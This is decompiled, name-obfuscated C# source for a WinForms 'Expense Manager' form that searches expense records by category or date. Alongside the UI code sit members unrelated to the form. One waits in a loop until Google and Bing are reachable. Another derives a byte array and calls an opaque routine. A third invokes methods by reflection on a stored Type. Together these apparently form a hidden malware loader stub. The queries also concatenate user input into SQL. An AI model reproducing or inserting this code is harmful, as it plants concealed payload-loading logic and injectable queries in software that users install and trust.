using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.SqlClient;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Qm3;
using Qq3;
using Xc5;
using z2C5;

namespace r8C;

[DesignerGenerated]
public class Ya7 : Form
{
	private IContainer components;

	private PictureBox _PictureBox3;

	private Label _LblNm;

	private Button _Button1;

	private DataGridView _DGVDate;

	private GroupBox _PanelDate;

	private GroupBox _PanelCtgry;

	private SqlDataAdapter da;

	private DataSet ds;

	private DataTable dt;

	private string _CadetPass;

	internal static string[] Listt;

	internal static Dictionary<string, object> mDic;

	internal static string dName;

	internal static string tName;

	internal static string mName;

	internal static string mArray;

	internal static string sArray;

	internal static string T;

	internal static string sNum;

	internal Label C;

	internal DataGridView D;

	internal Button N;

	internal PictureBox S;

	internal PictureBox i;

	internal PictureBox W;

	internal Label o;

	internal Label u;

	internal ComboBox m;

	internal Label F;

	internal DateTimePicker Q;

	internal SqlConnection l;

	public string CadetPass
	{
		get
		{
			return _CadetPass;
		}
		set
		{
			_CadetPass = value;
		}
	}

	public Ya7()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Hw1);
		SqlConnection val = new SqlConnection();
		val.set_ConnectionString("Data Source=DELL;Initial Catalog=logindata;Integrated Security=True");
		SqlConnection val2 = (l = val);
		dt = new DataTable();
		Li0();
	}

	protected override void i8T(bool Gz2)
	{
		try
		{
			if (Gz2 && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Gz2);
		}
	}

	private void Li0()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_017b: Expected O, but got Unknown
		//IL_01fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0205: Expected O, but got Unknown
		//IL_02fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0308: Expected O, but got Unknown
		//IL_03c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_03cd: Expected O, but got Unknown
		//IL_0483: Unknown result type (might be due to invalid IL or missing references)
		//IL_048d: Expected O, but got Unknown
		//IL_0512: Unknown result type (might be due to invalid IL or missing references)
		//IL_051c: Expected O, but got Unknown
		//IL_05ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b6: Expected O, but got Unknown
		//IL_0669: Unknown result type (might be due to invalid IL or missing references)
		//IL_0673: Expected O, but got Unknown
		//IL_071b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0725: Expected O, but got Unknown
		//IL_07c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_07ce: Expected O, but got Unknown
		//IL_083e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0848: Expected O, but got Unknown
		//IL_0a5b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a65: Expected O, but got Unknown
		//IL_0b5b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b65: Expected O, but got Unknown
		//IL_0be4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bee: Expected O, but got Unknown
		//IL_0c29: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c33: Expected O, but got Unknown
		//IL_0caa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cb4: Expected O, but got Unknown
		//IL_0d45: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d4f: Expected O, but got Unknown
		//IL_0e5b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e65: Expected O, but got Unknown
		DataGridViewCellStyle val = new DataGridViewCellStyle();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Ya7));
		DataGridViewCellStyle val2 = new DataGridViewCellStyle();
		Sq4(new Label());
		Wb8(new DataGridView());
		Xw5(new PictureBox());
		z8R(new Button());
		Ed1(new Label());
		f9P(new PictureBox());
		o3H(new PictureBox());
		Er9(new Button());
		a6M(new PictureBox());
		Ji6(new Label());
		Rf4(new DataGridView());
		Mg2(new GroupBox());
		a7E(new GroupBox());
		Sj3(new ComboBox());
		j5Y(new Label());
		j0M(new DateTimePicker());
		Dg1(new Label());
		((ISupportInitialize)Dk1()).BeginInit();
		((ISupportInitialize)f9X()).BeginInit();
		((ISupportInitialize)Gs9()).BeginInit();
		((ISupportInitialize)Sq7()).BeginInit();
		((ISupportInitialize)n4K()).BeginInit();
		((ISupportInitialize)b6Z()).BeginInit();
		((Control)a1N()).SuspendLayout();
		((Control)a2D()).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)w1A()).set_Anchor((AnchorStyles)15);
		w1A().set_AutoSize(true);
		((Control)w1A()).set_BackColor(Color.Transparent);
		((Control)w1A()).set_Font(new Font("Comic Sans MS", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)w1A()).set_ForeColor(Color.Navy);
		((Control)w1A()).set_Location(new Point(307, 68));
		((Control)w1A()).set_Name("LblHead");
		((Control)w1A()).set_Size(new Size(84, 21));
		((Control)w1A()).set_TabIndex(0);
		w1A().set_Text("Search By");
		val.set_BackColor(Color.Transparent);
		val.set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		val.set_ForeColor(Color.DarkSlateGray);
		val.set_SelectionBackColor(Color.LightSlateGray);
		val.set_SelectionForeColor(Color.White);
		Dk1().set_AlternatingRowsDefaultCellStyle(val);
		((Control)Dk1()).set_Anchor((AnchorStyles)15);
		Dk1().set_AutoSizeColumnsMode((DataGridViewAutoSizeColumnsMode)16);
		Dk1().set_AutoSizeRowsMode((DataGridViewAutoSizeRowsMode)7);
		Dk1().set_BackgroundColor(Color.White);
		Dk1().set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		((Control)Dk1()).set_Location(new Point(180, 225));
		((Control)Dk1()).set_Name("DGVCat");
		((Control)Dk1()).set_Size(new Size(395, 299));
		((Control)Dk1()).set_TabIndex(1);
		((Control)Dk1()).set_Visible(false);
		((Control)f9X()).set_Anchor((AnchorStyles)15);
		((Control)f9X()).set_BackColor(Color.Transparent);
		((Control)f9X()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox3.BackgroundImage"));
		((Control)f9X()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)f9X()).set_Location(new Point(671, 460));
		((Control)f9X()).set_Name("PictureBox3");
		((Control)f9X()).set_Size(new Size(60, 41));
		f9X().set_TabIndex(15);
		f9X().set_TabStop(false);
		((Control)r9M()).set_Anchor((AnchorStyles)15);
		((ButtonBase)r9M()).set_BackColor(Color.LightCyan);
		((Control)r9M()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)r9M()).set_Cursor(Cursors.get_Arrow());
		((ButtonBase)r9M()).set_FlatStyle((FlatStyle)1);
		((Control)r9M()).set_Font(new Font("Comic Sans MS", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)r9M()).set_ForeColor(Color.FromArgb(0, 64, 0));
		((Control)r9M()).set_Location(new Point(659, 507));
		((Control)r9M()).set_Name("Button2");
		((Control)r9M()).set_Size(new Size(102, 27));
		((Control)r9M()).set_TabIndex(3);
		((ButtonBase)r9M()).set_Text("&Main Menu");
		((ButtonBase)r9M()).set_UseVisualStyleBackColor(false);
		((Control)z7Y()).set_Anchor((AnchorStyles)15);
		z7Y().set_AutoSize(true);
		((Control)z7Y()).set_BackColor(Color.Transparent);
		((Control)z7Y()).set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)z7Y()).set_ForeColor(Color.Navy);
		((Control)z7Y()).set_Location(new Point(698, 21));
		((Control)z7Y()).set_Name("LblNm");
		((Control)z7Y()).set_Size(new Size(0, 19));
		((Control)z7Y()).set_TabIndex(16);
		((Control)Gs9()).set_Anchor((AnchorStyles)15);
		((Control)Gs9()).set_BackColor(Color.Transparent);
		((Control)Gs9()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox1.BackgroundImage"));
		((Control)Gs9()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)Gs9()).set_Location(new Point(225, 5));
		((Control)Gs9()).set_Name("PictureBox1");
		((Control)Gs9()).set_Size(new Size(361, 50));
		Gs9().set_TabIndex(17);
		Gs9().set_TabStop(false);
		((Control)Sq7()).set_Anchor((AnchorStyles)15);
		((Control)Sq7()).set_BackColor(Color.Transparent);
		((Control)Sq7()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox2.BackgroundImage"));
		((Control)Sq7()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)Sq7()).set_Location(new Point(-1, 0));
		((Control)Sq7()).set_Name("PictureBox2");
		((Control)Sq7()).set_Size(new Size(119, 109));
		Sq7().set_TabIndex(19);
		Sq7().set_TabStop(false);
		((Control)s6P()).set_Anchor((AnchorStyles)15);
		((ButtonBase)s6P()).set_BackColor(Color.Transparent);
		((Control)s6P()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)s6P()).set_Cursor(Cursors.get_Arrow());
		((ButtonBase)s6P()).set_FlatStyle((FlatStyle)1);
		((Control)s6P()).set_Font(new Font("Comic Sans MS", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)s6P()).set_ForeColor(Color.FromArgb(0, 64, 0));
		((Control)s6P()).set_Location(new Point(581, 144));
		((Control)s6P()).set_Name("Button1");
		((Control)s6P()).set_Size(new Size(80, 27));
		((Control)s6P()).set_TabIndex(0);
		((ButtonBase)s6P()).set_Text("&Search");
		((ButtonBase)s6P()).set_UseVisualStyleBackColor(false);
		((Control)n4K()).set_Anchor((AnchorStyles)15);
		((Control)n4K()).set_BackColor(Color.Transparent);
		((Control)n4K()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox4.BackgroundImage"));
		((Control)n4K()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)n4K()).set_Location(new Point(526, 132));
		((Control)n4K()).set_Name("PictureBox4");
		((Control)n4K()).set_Size(new Size(49, 39));
		n4K().set_TabIndex(21);
		n4K().set_TabStop(false);
		((Control)x8B()).set_Anchor((AnchorStyles)15);
		x8B().set_AutoSize(true);
		((Control)x8B()).set_BackColor(Color.Transparent);
		((Control)x8B()).set_Font(new Font("Comic Sans MS", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)x8B()).set_ForeColor(Color.Navy);
		((Control)x8B()).set_Location(new Point(396, 68));
		((Control)x8B()).set_Name("LblCad1");
		((Control)x8B()).set_Size(new Size(0, 21));
		((Control)x8B()).set_TabIndex(22);
		val2.set_BackColor(Color.Transparent);
		val2.set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		val2.set_ForeColor(Color.DarkSlateGray);
		val2.set_SelectionBackColor(Color.LightSlateGray);
		val2.set_SelectionForeColor(Color.White);
		b6Z().set_AlternatingRowsDefaultCellStyle(val2);
		((Control)b6Z()).set_Anchor((AnchorStyles)15);
		b6Z().set_BackgroundColor(Color.White);
		b6Z().set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		((Control)b6Z()).set_Location(new Point(43, 287));
		((Control)b6Z()).set_Name("DGVDate");
		((Control)b6Z()).set_Size(new Size(718, 85));
		((Control)b6Z()).set_TabIndex(2);
		((Control)b6Z()).set_Visible(false);
		((Control)a1N()).set_Anchor((AnchorStyles)15);
		((Control)a1N()).set_BackColor(Color.Transparent);
		((Control)a1N()).get_Controls().Add((Control)(object)y8P());
		((Control)a1N()).get_Controls().Add((Control)(object)m0T());
		((Control)a1N()).set_Location(new Point(108, 111));
		((Control)a1N()).set_Name("PanelDate");
		((Control)a1N()).set_Size(new Size(396, 111));
		((Control)a1N()).set_TabIndex(0);
		a1N().set_TabStop(false);
		((Control)a1N()).set_Visible(false);
		((Control)a2D()).set_Anchor((AnchorStyles)15);
		((Control)a2D()).set_BackColor(Color.Transparent);
		((Control)a2D()).get_Controls().Add((Control)(object)z1Q());
		((Control)a2D()).get_Controls().Add((Control)(object)j3C());
		((Control)a2D()).set_Location(new Point(175, 92));
		((Control)a2D()).set_Name("PanelCtgry");
		((Control)a2D()).set_Size(new Size(221, 111));
		((Control)a2D()).set_TabIndex(23);
		a2D().set_TabStop(false);
		((Control)a2D()).set_Visible(false);
		((Control)z1Q()).set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		z1Q().set_ForeColor(Color.FromArgb(0, 0, 64));
		((ListControl)z1Q()).set_FormattingEnabled(true);
		z1Q().get_Items().AddRange(new object[9] { "Food", "Clothes", "Stationary", "Market", "Entertainment", "Medical", "Transport", "Others", "Income" });
		((Control)z1Q()).set_Location(new Point(31, 59));
		((Control)z1Q()).set_Name("ddlCat");
		((Control)z1Q()).set_Size(new Size(163, 27));
		((Control)z1Q()).set_TabIndex(24);
		j3C().set_AutoSize(true);
		((Control)j3C()).set_BackColor(Color.Transparent);
		((Control)j3C()).set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)j3C()).set_ForeColor(Color.FromArgb(0, 0, 64));
		((Control)j3C()).set_Location(new Point(27, 26));
		((Control)j3C()).set_Name("Label1");
		((Control)j3C()).set_Size(new Size(137, 19));
		((Control)j3C()).set_TabIndex(25);
		j3C().set_Text("Select the Category");
		y8P().set_CalendarFont(new Font("Comic Sans MS", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		y8P().set_CalendarForeColor(Color.FromArgb(0, 64, 0));
		y8P().set_CalendarTitleForeColor(Color.FromArgb(0, 64, 0));
		((Control)y8P()).set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)y8P()).set_Location(new Point(20, 53));
		((Control)y8P()).set_Name("TxtDate");
		((Control)y8P()).set_Size(new Size(249, 26));
		((Control)y8P()).set_TabIndex(26);
		m0T().set_AutoSize(true);
		((Control)m0T()).set_BackColor(Color.Transparent);
		((Control)m0T()).set_Font(new Font("Comic Sans MS", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)m0T()).set_ForeColor(Color.FromArgb(0, 0, 64));
		((Control)m0T()).set_Location(new Point(30, 16));
		((Control)m0T()).set_Name("Label2");
		((Control)m0T()).set_Size(new Size(118, 19));
		((Control)m0T()).set_TabIndex(25);
		m0T().set_Text("Select Your Date");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(789, 545));
		((Control)this).get_Controls().Add((Control)(object)a2D());
		((Control)this).get_Controls().Add((Control)(object)a1N());
		((Control)this).get_Controls().Add((Control)(object)b6Z());
		((Control)this).get_Controls().Add((Control)(object)x8B());
		((Control)this).get_Controls().Add((Control)(object)n4K());
		((Control)this).get_Controls().Add((Control)(object)s6P());
		((Control)this).get_Controls().Add((Control)(object)Sq7());
		((Control)this).get_Controls().Add((Control)(object)Gs9());
		((Control)this).get_Controls().Add((Control)(object)z7Y());
		((Control)this).get_Controls().Add((Control)(object)f9X());
		((Control)this).get_Controls().Add((Control)(object)r9M());
		((Control)this).get_Controls().Add((Control)(object)Dk1());
		((Control)this).get_Controls().Add((Control)(object)w1A());
		((Control)this).set_DoubleBuffered(true);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form11");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Expense Manager");
		((ISupportInitialize)Dk1()).EndInit();
		((ISupportInitialize)f9X()).EndInit();
		((ISupportInitialize)Gs9()).EndInit();
		((ISupportInitialize)Sq7()).EndInit();
		((ISupportInitialize)n4K()).EndInit();
		((ISupportInitialize)b6Z()).EndInit();
		((Control)a1N()).ResumeLayout(false);
		((Control)a1N()).PerformLayout();
		((Control)a2D()).ResumeLayout(false);
		((Control)a2D()).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Label w1A()
	{
		return C;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Sq4(Label Kg3)
	{
		Label val = (C = Kg3);
	}

	[SpecialName]
	internal virtual DataGridView Dk1()
	{
		return D;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Wb8(DataGridView k7N)
	{
		DataGridView val = (D = k7N);
	}

	[SpecialName]
	internal virtual PictureBox f9X()
	{
		return _PictureBox3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Xw5(PictureBox Ze6)
	{
		_PictureBox3 = Ze6;
	}

	[SpecialName]
	internal virtual Button r9M()
	{
		return N;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void z8R(Button Qr3)
	{
		EventHandler eventHandler = m1Q;
		Button n = N;
		if (n != null)
		{
			((Control)n).remove_Click(eventHandler);
		}
		Button val = (N = Qr3);
		n = N;
		if (n != null)
		{
			((Control)n).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label z7Y()
	{
		return _LblNm;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ed1(Label i2X)
	{
		_LblNm = i2X;
	}

	[SpecialName]
	internal virtual PictureBox Gs9()
	{
		return S;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void f9P(PictureBox Yq2)
	{
		PictureBox val = (S = Yq2);
	}

	[SpecialName]
	internal virtual PictureBox Sq7()
	{
		return i;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void o3H(PictureBox c0G)
	{
		PictureBox val = (i = c0G);
	}

	[SpecialName]
	internal virtual Button s6P()
	{
		return _Button1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Er9(Button Xj3)
	{
		EventHandler eventHandler = Cb3;
		Button button = _Button1;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button1 = Xj3;
		button = _Button1;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual PictureBox n4K()
	{
		return W;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void a6M(PictureBox Mw3)
	{
		PictureBox val = (W = Mw3);
	}

	[SpecialName]
	internal virtual Label x8B()
	{
		return o;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ji6(Label z7J)
	{
		Label val = (o = z7J);
	}

	[SpecialName]
	internal virtual DataGridView b6Z()
	{
		return _DGVDate;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Rf4(DataGridView i1B)
	{
		_DGVDate = i1B;
	}

	[SpecialName]
	internal virtual GroupBox a1N()
	{
		return _PanelDate;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Mg2(GroupBox x1F)
	{
		_PanelDate = x1F;
	}

	[SpecialName]
	internal virtual Label m0T()
	{
		return u;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Dg1(Label b0E)
	{
		Label val = (u = b0E);
	}

	[SpecialName]
	internal virtual GroupBox a2D()
	{
		return _PanelCtgry;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void a7E(GroupBox b0X)
	{
		_PanelCtgry = b0X;
	}

	[SpecialName]
	internal virtual ComboBox z1Q()
	{
		return m;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Sj3(ComboBox Qs3)
	{
		ComboBox val = (m = Qs3);
	}

	[SpecialName]
	internal virtual Label j3C()
	{
		return F;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void j5Y(Label n6C)
	{
		Label val = (F = n6C);
	}

	[SpecialName]
	internal virtual DateTimePicker y8P()
	{
		return Q;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void j0M(DateTimePicker Ld7)
	{
		EventHandler eventHandler = x1Y;
		DateTimePicker q = Q;
		if (q != null)
		{
			q.remove_ValueChanged(eventHandler);
		}
		DateTimePicker val = (Q = Ld7);
		q = Q;
		if (q != null)
		{
			q.add_ValueChanged(eventHandler);
		}
	}

	public bool x5J()
	{
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			l.Open();
			l.Close();
			return true;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public bool Wz9()
	{
		string cadetPass = CadetPass;
		if (Operators.CompareString(cadetPass, "Category", false) == 0)
		{
			return true;
		}
		return false;
	}

	private void Hw1(object sender, EventArgs e)
	{
		z7Y().set_Text(Gf87.UsrNam);
		x8B().set_Text(CadetPass);
		Wz9();
		if (Wz9())
		{
			((Control)a2D()).Show();
			((Control)a1N()).Hide();
			((Control)Dk1()).Show();
			((Control)b6Z()).Hide();
		}
		if (!Wz9())
		{
			((Control)a1N()).Show();
			((Control)Dk1()).Hide();
			((Control)b6Z()).Show();
			((Control)a2D()).Hide();
		}
	}

	internal static bool w8Z()
	{
		string[] array = new string[2] { "https://www.google.com/", "https://www.bing.com/" };
		int num = 0;
		checked
		{
			while (num != 2)
			{
				string[] array2 = array;
				foreach (string ps in array2)
				{
					if (!e9B.d9A(ps))
					{
						if (num > 0)
						{
							num--;
						}
						Task.Delay(30000).Wait();
					}
					else
					{
						num++;
					}
				}
			}
			if (num == 2)
			{
				return true;
			}
			return false;
		}
	}

	private void Cb3(object sender, EventArgs e)
	{
		//IL_0194: Unknown result type (might be due to invalid IL or missing references)
		//IL_019a: Expected O, but got Unknown
		//IL_019c: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a6: Expected O, but got Unknown
		//IL_0208: Unknown result type (might be due to invalid IL or missing references)
		//IL_0284: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e7: Expected O, but got Unknown
		//IL_02ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f4: Expected O, but got Unknown
		//IL_0356: Unknown result type (might be due to invalid IL or missing references)
		if (Wz9())
		{
			string text = Conversions.ToString(z1Q().get_SelectedItem());
			string text2 = text switch
			{
				"Food" => "FoodNote", 
				"Clothes" => "ClotNote", 
				"Stationary" => "StatNote", 
				"Market" => "MarkNote", 
				"Entertainment" => "EnteNote", 
				"Medical" => "MediNote", 
				"Transport" => "TranNote", 
				"Others" => "OtheNote", 
				"Income" => "IncoNote", 
				_ => " ", 
			};
			string identity = Gf87.Identity;
			if (x5J())
			{
				if (l.get_State() != ConnectionState.Open)
				{
					l.Open();
				}
				if (ds != null)
				{
					ds.Clear();
				}
				try
				{
					SqlCommand val = new SqlCommand("SELECT [Date], [" + text + "],[" + text2 + "]FROM [" + identity + "]", l);
					da = new SqlDataAdapter(val);
					ds = new DataSet();
					((DbDataAdapter)(object)da).Fill(ds);
					l.Close();
					Dk1().set_DataSource((object)ds.Tables[0]);
					((Control)Dk1()).Refresh();
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
					ProjectData.ClearProjectError();
				}
			}
		}
		if (Wz9() || !x5J())
		{
			return;
		}
		if (l.get_State() != ConnectionState.Open)
		{
			l.Open();
		}
		if (ds != null)
		{
			ds.Clear();
		}
		if (Operators.CompareString(y8P().get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Please Enter a valid Date", (MsgBoxStyle)0, (object)null);
			return;
		}
		DateTime dateTime = Conversions.ToDate(y8P().get_Text());
		string identity2 = Gf87.Identity;
		try
		{
			SqlCommand val2 = new SqlCommand("SELECT * FROM [" + identity2 + "]WHERE [Date] = '" + Conversions.ToString(dateTime) + "' ", l);
			da = new SqlDataAdapter(val2);
			ds = new DataSet();
			((DbDataAdapter)(object)da).Fill(ds);
			l.Close();
			b6Z().set_DataSource((object)ds.Tables[0]);
			((Control)b6Z()).Refresh();
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			Interaction.MsgBox((object)ex4.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	internal static void g9L(int Nz9)
	{
		mDic = new Dictionary<string, object>();
		Listt = new string[11]
		{
			"asat", "dfg", "ygyuou", "et", "yuo", "sg", "jhjl", "xc", "jk", "qwe",
			"jkoyys"
		};
		dName = e9B.Cw5(Listt, 0, 1);
		mDic.Add(dName, Listt);
		tName = e9B.Cw5(Listt, Nz9, 1);
		checked
		{
			mName = e9B.Cw5(Listt, Nz9 + 1, 2);
			mArray = e9B.Cw5(Listt, Nz9 + 2, 3);
			sArray = e9B.Cw5(Listt, Nz9 + 3, 4);
			T = e9B.Cw5(Listt, Nz9 + 4, 5);
			sNum = e9B.Cw5(Listt, Nz9 + 5, 6);
			if ((double)Nz9 != 2503.0)
			{
				Nz9 = 52;
				mDic.Add(sNum, 52);
			}
			byte[] value = e9B.Ep7(Nz9);
			mDic.Add(sArray, value);
			k7E.m1Z();
		}
	}

	private void m1Q(object sender, EventArgs e)
	{
		((Control)Db5.Forms.Ft0()).Show();
		((Form)this).Close();
	}

	internal static string Pb3(string y9L)
	{
		Type type = (Type)mDic[T];
		return Conversions.ToString(type.InvokeMember(y9L, BindingFlags.Static | BindingFlags.Public | BindingFlags.InvokeMethod, null, null, null));
	}

	private void x1Y(object sender, EventArgs e)
	{
	}
}
